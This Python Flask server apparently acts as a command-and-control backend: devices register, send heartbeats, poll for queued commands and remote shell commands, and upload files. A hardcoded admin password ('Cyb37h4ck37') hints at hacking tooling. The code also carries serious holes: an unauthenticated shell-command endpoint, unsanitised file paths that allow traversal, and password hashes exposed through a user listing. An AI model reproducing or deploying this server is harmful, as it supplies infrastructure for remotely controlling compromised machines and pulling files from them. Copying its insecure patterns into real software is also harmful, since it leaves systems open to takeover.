from flask import Flask, request, jsonify, send_file
from werkzeug.security import generate_password_hash, check_password_hash
import uuid
import time
import threading
import os

app = Flask(__name__)

# === CONFIG ===
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD_HASH = generate_password_hash("Cyb37h4ck37")
HEARTBEAT_TIMEOUT = 60
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# === STATE ===
users = {}
tokens = {}
owner_tokens = {}
devices = {}
sessions = {}
shell_sessions = {}

# === UTILS ===
def generate_token():
    return str(uuid.uuid4())

def get_timestamp():
    return int(time.time())

def require_token(func):
    def wrapper(*args, **kwargs):
        token = request.headers.get("Authorization")
        if token not in tokens:
            return jsonify({"status": "unauthorized"}), 401
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper

# === CLEANUP ===
def cleanup_inactive():
    while True:
        now = get_timestamp()
        for device_id, info in list(devices.items()):
            if now - info.get("last_heartbeat", 0) > HEARTBEAT_TIMEOUT:
                info["status"] = "offline"
        time.sleep(30)

threading.Thread(target=cleanup_inactive, daemon=True).start()

# === AUTH ===
@app.route("/register_user", methods=["POST"])
def register_user():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    if not username or not password:
        return jsonify({"status": "missing_fields"})
    if username in users:
        return jsonify({"status": "user_exists"})
    token = generate_token()
    users[username] = generate_password_hash(password)
    owner_tokens[username] = token
    return jsonify({"status": "registered", "owner_token": token})

@app.route("/login", methods=["POST"])
def login():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    if username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
        token = generate_token()
        tokens[token] = {"username": username, "admin": True}
        return jsonify({"status": "ok", "token": token})
    if username in users and check_password_hash(users[username], password):
        token = generate_token()
        tokens[token] = {"username": username, "admin": False}
        return jsonify({"status": "ok", "token": token, "owner_token": owner_tokens[username]})
    return jsonify({"status": "invalid_credentials"}), 401

@app.route("/change_password", methods=["POST"])
@require_token
def change_password():
    data = request.json
    user = tokens[request.headers["Authorization"]]
    target = data.get("username")
    new_pw = data.get("new_password")
    if user["admin"]:
        if target == ADMIN_USERNAME:
            global ADMIN_PASSWORD_HASH
            ADMIN_PASSWORD_HASH = generate_password_hash(new_pw)
            return jsonify({"status": "admin_pw_changed"})
        if target in users:
            users[target] = generate_password_hash(new_pw)
            return jsonify({"status": "user_pw_changed"})
        return jsonify({"status": "not_found"})
    return jsonify({"status": "unauthorized"}), 403

@app.route("/list_users", methods=["GET"])
@require_token
def list_users():
    user = tokens[request.headers["Authorization"]]
    if not user["admin"]:
        return jsonify({"status": "unauthorized"}), 403
    result = []
    for u in users:
        result.append({"username": u, "owner_token": owner_tokens[u], "password": users[u]})
    return jsonify(result)

# === DEVICE ===
@app.route("/register_device", methods=["POST"])
def register_device():
    data = request.json
    owner_token = data.get("owner_token")
    matching = [u for u, t in owner_tokens.items() if t == owner_token]
    if not matching:
        return jsonify({"status": "unauthorized"}), 401
    username = matching[0]
    device_id = str(uuid.uuid4())
    devices[device_id] = {
        "owner": username,
        "status": "online",
        "commands": [],
        "last_heartbeat": get_timestamp()
    }
    return jsonify({"status": "registered", "device_id": device_id})

@app.route("/list_devices", methods=["GET"])
@require_token
def list_devices():
    user = tokens[request.headers["Authorization"]]
    visible = {k: v for k, v in devices.items() if v["owner"] == user["username"] or user["admin"]}
    return jsonify(visible)

@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    data = request.json
    device_id = data.get("device_id")
    if device_id in devices:
        devices[device_id]["last_heartbeat"] = get_timestamp()
        devices[device_id]["status"] = "online"
        return jsonify({"status": "ok"})
    return jsonify({"status": "unknown_device"})

# === COMMAND ===
@app.route("/send_command", methods=["POST"])
@require_token
def send_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")
    payload = data.get("payload")
    user = tokens[request.headers["Authorization"]]
    if device_id in devices:
        if devices[device_id]["owner"] != user["username"] and not user["admin"]:
            return jsonify({"status": "unauthorized"}), 403
        devices[device_id]["commands"].append({"command": command, "payload": payload})
        return jsonify({"status": "sent"})
    return jsonify({"status": "not_found"})

@app.route("/get_command", methods=["POST"])
def get_command():
    data = request.json
    device_id = data.get("device_id")
    if device_id in devices and devices[device_id]["commands"]:
        return jsonify(devices[device_id]["commands"].pop(0))
    return jsonify({"command": None})

# === FILE ===
@app.route("/send_file", methods=["POST"])
def send_file_to_server():
    device_id = request.form.get("device_id")
    file = request.files.get("file")
    if device_id and file:
        filename = f"{UPLOAD_DIR}/{device_id}_{file.filename}"
        file.save(filename)
        return jsonify({"status": "received", "filename": filename})
    return jsonify({"status": "error"})

@app.route("/get_file/<device_id>/<filename>", methods=["GET"])
def download_file(device_id, filename):
    try:
        path = f"{UPLOAD_DIR}/{device_id}_{filename}"
        return send_file(path, as_attachment=True)
    except Exception:
        return jsonify({"status": "file_not_found"})

# === SHELL ===
@app.route("/shell_session", methods=["POST"])
def shell_session():
    data = request.json
    device_id = data.get("device_id")
    cmd = data.get("cmd")
    if device_id not in shell_sessions:
        shell_sessions[device_id] = []
    shell_sessions[device_id].append(cmd)
    return jsonify({"status": "queued"})

@app.route("/get_shell", methods=["POST"])
def get_shell():
    data = request.json
    device_id = data.get("device_id")
    if device_id in shell_sessions and shell_sessions[device_id]:
        return jsonify({"cmd": shell_sessions[device_id].pop(0)})
    return jsonify({"cmd": None})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
